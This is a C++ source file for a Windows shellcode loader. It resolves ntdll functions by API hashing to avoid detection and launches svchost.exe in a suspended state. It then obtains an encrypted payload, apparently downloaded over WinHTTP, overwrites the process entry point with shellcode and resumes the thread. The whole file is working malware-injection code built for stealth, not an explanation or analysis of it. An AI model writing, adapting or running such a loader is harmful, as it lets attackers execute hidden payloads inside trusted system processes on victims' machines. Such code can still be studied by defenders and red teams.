#include <windows.h>
#include <stdio.h>
#include "Api-Hashing.h"
#include "Custom-Functions.h"
#include "Hash.h"
#include "Winhttp-Request.h"

int main()
{
    NTSTATUS status;
    HMODULE ntDllAddr;
    LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();
    LPVOID imageBaseAddr = NULL;
    PIMAGE_DOS_HEADER dosHeader = NULL;
    PIMAGE_NT_HEADERS ntHeaders = NULL;
    PVOID peHeaders = NULL;
    PVOID entryPoint = NULL;
    SIZE_T bytesRead = NULL;
    SIZE_T bytesWritten = NULL;
    ULONG oldProtection = 0;
    LPCSTR nameNtDll = "ntdll.dll";
    LPCSTR target = "C:\\Windows\\System32\\svchost.exe";
   
    // Dynamic Invoke of the ntdll
    ntDllAddr = GetModuleHandleA(nameNtDll);
    // Dynamic Invoke of the functions of the ntdll using api hashing
    _NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)getProcAddressCustom(ntDllAddr, NtAllocateVirtualMemory_HASH);
    _NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)getProcAddressCustom(ntDllAddr, NtWriteVirtualMemory_HASH);
    _NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)getProcAddressCustom(ntDllAddr, NtQueryInformationProcess_HASH);
    _NtProtectVirtualMemory NtProtectVirtualMemory = (_NtProtectVirtualMemory)getProcAddressCustom(ntDllAddr, NtProtectVirtualMemory_HASH);
    _NtWaitForSingleObject NtWaitForSingleObject = (_NtWaitForSingleObject)getProcAddressCustom(ntDllAddr, NtWaitForSingleObject_HASH);


    // Launching suspended process
    if (!lauchSuspendProcess((LPSTR)target, pi))
        exit(1);
    
    EncryptedData data = getPayload();

    if (pi == nullptr)
    {
        printf("[-] Failed to start the process.\n");
        exit(1);
    }

    printf("[+] Process started successfully...\n");

    // Get the offset location of the image base address
    if (!getImageBaseAddr(imageBaseAddr, pi->hProcess))
        exit(1);

    printf("[*] Allocating memory for PE Headers...\n");

    peHeaders = LocalAlloc(LPTR, 0x200 * sizeof(BYTE));
    
    // Read memory of the imageBaseAddr
    if (!ReadProcessMemory(pi->hProcess, imageBaseAddr, peHeaders, 0x200, &bytesRead))
    {
        printf("[-] NTSTATUS ERROR : %x\r\n", GetLastError());
        exit(1);
    }

    printf("[+] Successfully allocate memory...\n");

    // Ensure peHeaders is valid.
    if (!peHeaders) 
    {
        printf("[-] peHeaders is NULL!\n");
        exit(1);
    }

    dosHeader = (PIMAGE_DOS_HEADER)peHeaders;

    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) 
    {
        printf("[-] Invalid MZ signature!\n");
        exit(1);
    }

    ntHeaders = (PIMAGE_NT_HEADERS)((PBYTE)peHeaders + dosHeader->e_lfanew);
    entryPoint = (PBYTE)imageBaseAddr + ntHeaders->OptionalHeader.AddressOfEntryPoint;

    PVOID entryPointBackup = entryPoint;
    //SIZE_T regionSizeBackup = regionSize;
    printf("[*] Change the protection of the region...\n");

    PVOID dataBuf = data.data;
    SIZE_T size = data.size;
    SIZE_T sizeBackup = size;

    if (!NT_SUCCESS(status = NtProtectVirtualMemory(pi->hProcess, &entryPoint, &size, PAGE_EXECUTE_READWRITE, &oldProtection)))
    {
        printf("[-] NTSTATUS ERROR : %x ", status);
        exit(1);
    }

    printf("[*] Writing shellcode into memory...\n");
    if (!NT_SUCCESS(status = NtWriteVirtualMemory(pi->hProcess, entryPointBackup, dataBuf, sizeBackup, &bytesWritten)))
    {
        printf("[-] NTSTATUS ERROR : %x ", status);  
        exit(1);
    }

    printf("[*] Reset the protection of the region...\n");
    if (!NT_SUCCESS(status = NtProtectVirtualMemory(pi->hProcess, &entryPoint, &size, PAGE_EXECUTE_READ, &oldProtection)))
    {
        printf("[-] NTSTATUS ERROR : %x ", status);
        exit(1);
    }

    printf("[*] Resume Thread...\n");
    ResumeThread(pi->hThread);

    printf("[+] Done.\n");
    return 0;
}